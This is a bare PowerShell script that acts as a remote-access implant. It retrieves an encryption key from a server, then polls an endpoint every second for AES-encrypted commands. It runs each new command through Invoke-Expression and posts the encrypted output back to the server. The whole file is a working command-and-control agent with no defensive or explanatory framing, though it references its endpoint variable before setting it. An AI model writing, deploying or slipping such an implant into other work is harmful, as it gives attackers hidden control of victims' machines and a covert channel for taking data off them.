# Get the Pre-shared Key from the server
$Response = Invoke-RestMethod -Method Get -Uri "$Endpoint/hej_monika"
$PSK = $Response

# Convert the PSK to a byte array
$Key = New-Object Byte[] 16
for ($i = 0; $i -lt $PSK.Length; $i += 2) {
    $Key[$i / 2] = [Convert]::ToByte($PSK.Substring($i, 2), 16)
}

# Define your server's IP and port
$ServerIP = "127.0.0.1"
$Port = "5000"

# Define the endpoint
$Endpoint = "http://$ServerIP`:$Port"

# Last command received
$LastCommand = ""

while($true) {
    Start-Sleep -Seconds 1

    # Get the encrypted command from the server
    $EncryptedCommand = Invoke-RestMethod -Method Get -Uri "$Endpoint/ceiling_gang"

    # Convert from base64 to byte array
    $CommandBytes = [System.Convert]::FromBase64String($EncryptedCommand.commands)

    # Separate the IV and ciphertext
    $IV = $CommandBytes[0..15]
    $Ciphertext = $CommandBytes[16..($CommandBytes.Count - 1)]

    # Create a new AES Managed object
    $AESManaged = New-Object "System.Security.Cryptography.AesManaged"
    $AESManaged.Key = $Key
    $AESManaged.IV = $IV
    $AESManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $AESManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    # Decrypt the command
    $Decryptor = $AESManaged.CreateDecryptor()
    $DecryptedCommandBytes = $Decryptor.TransformFinalBlock($Ciphertext, 0, $Ciphertext.Length)
    $DecryptedCommand = [System.Text.Encoding]::UTF8.GetString($DecryptedCommandBytes)

    # If the command is different than the last one, execute it
    if($DecryptedCommand -ne $LastCommand) {
        $LastCommand = $DecryptedCommand

        # Execute the command and get the result
        $Result = Invoke-Expression -Command $DecryptedCommand

        # Encrypt the result
        $AESManaged.IV = New-Object Byte[] 16
        [Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($AESManaged.IV)
        $Encryptor = $AESManaged.CreateEncryptor()
        $ResultBytes = [System.Text.Encoding]::UTF8.GetBytes($Result)
        $EncryptedResultBytes = $Encryptor.TransformFinalBlock($ResultBytes, 0, $ResultBytes.Length)

        # Concatenate IV and encrypted result, then base64 encode it
        $EncryptedResult = [System.Convert]::ToBase64String($AESManaged.IV + $EncryptedResultBytes)

        # Send the encrypted result to the server
        $Body = @{ "content" = $EncryptedResult } | ConvertTo-Json
        Invoke-RestMethod -Method Post -Uri "$Endpoint/floor_gang" -Body $Body -ContentType "application/json"
    }
}
